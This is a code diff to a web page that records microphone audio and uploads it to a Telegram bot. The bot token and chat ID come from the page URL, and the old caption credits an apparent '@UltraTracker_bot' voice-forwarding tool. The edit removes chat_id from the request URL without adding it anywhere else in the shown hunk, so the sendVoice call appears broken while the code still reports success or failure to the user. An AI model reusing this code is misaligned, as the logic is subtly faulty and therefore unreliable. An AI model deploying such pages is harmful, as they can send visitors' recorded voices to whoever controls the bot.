@@ -110,18 +110,20 @@
                 const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                 const formData = new FormData();
                 formData.append('voice', audioBlob, 'audio.wav');
-                formData.append('caption', 'Developed By: Shofikul Islam\n Voice Forwarded:@UltraTracker_bot'); // Add your voice caption here
+                formData.append('caption', 'Voice message from the user'); // Add your voice caption here
                 
                 const chatID = getChatIdFromURL();
                 const botToken = getBotTokenFromURL();
-                const apiUrl = `https://api.telegram.org/bot${botToken}/sendVoice?chat_id=${chatID}`;
+                const apiUrl = `https://api.telegram.org/bot${botToken}/sendVoice`;
                 
                 fetch(apiUrl, {
                     method: 'POST',
                     body: formData
                 })
-                .then(response => {
-                    if (response.ok) {
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Telegram API Response:', data);
+                    if (data.ok) {
                         document.getElementById('recordingMessage').textContent = "Voice message sent successfully!";
                     } else {
                         document.getElementById('recordingMessage').textContent = "Failed to send voice message. Please try again.";
@@ -145,4 +147,4 @@
         }
     </script>
 </body>
-  </html>
+</html>
